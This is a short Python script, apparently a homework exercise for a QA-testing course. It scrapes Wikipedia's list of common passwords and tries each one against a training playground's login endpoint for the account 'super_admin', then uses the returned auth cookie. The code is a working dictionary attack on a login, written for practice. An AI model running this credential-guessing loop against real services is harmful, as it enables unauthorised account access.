import json

import requests
from bs4 import BeautifulSoup
wiki = requests.get('https://en.wikipedia.org/wiki/List_of_the_most_common_passwords')

soup = BeautifulSoup(wiki.text, 'html.parser')
table = soup.find_all('table')[1]

list_of_elms = table.find_all("td")
words = []
for i in range(len(list_of_elms)):
    word = str(list_of_elms[i]).replace('<td align="center">', "").replace('<td align="left">', '').replace('</td>', "").replace("\n", '')
    words.append(word)

payloads = {"login":'super_admin', "password": ''}

for password in words:
    payloads["password"] = password
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=payloads)
    if json.loads(response.text)["equals"]:
        right_password = password
        cookie_value = response.cookies.values()[0]
        break

cookies = {'auth_cookie': cookie_value}
get_answer = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies=cookies)

print(get_answer.text)
print(f'Right password is {password}')